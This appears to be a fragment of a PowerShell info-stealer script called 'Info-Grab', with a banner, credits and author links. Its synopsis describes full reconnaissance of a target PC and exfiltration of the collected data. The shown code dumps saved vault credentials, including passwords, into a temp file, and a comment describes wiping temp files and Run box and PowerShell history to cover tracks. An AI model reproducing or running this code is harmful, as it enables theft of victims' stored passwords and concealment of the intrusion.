############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Info-Grab         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 3.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
...
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                    Special Thanks to:                                              #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                   Simen Kjeserud (Original creator)                               #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                 Gachnang                                                        #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                   DannyK999                                                       #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################
                                                                                                                                                                                                                                               
<#

.SYNOPSIS
	This is a complete recon of a target PC and exfiltration of that data
...
==================================================================" >> $env:TMP\$FileName
$vault | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize >> $env:TMP\$FileName
...
# Empty TMP folder; Delete RunBox history; Delete Powershell history
